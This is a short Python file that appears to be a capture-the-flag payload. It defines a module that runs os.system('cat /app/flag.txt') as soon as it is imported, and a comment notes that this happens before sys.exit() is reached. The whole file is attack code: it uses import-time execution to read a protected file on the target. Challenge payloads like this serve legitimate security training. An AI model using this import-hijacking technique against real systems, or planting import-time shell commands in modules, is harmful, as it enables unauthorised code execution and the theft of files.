# Create a module that prints the flag when imported
import os
import sys

# This code runs AT IMPORT TIME, before sys.exit()
os.system('cat /app/flag.txt')
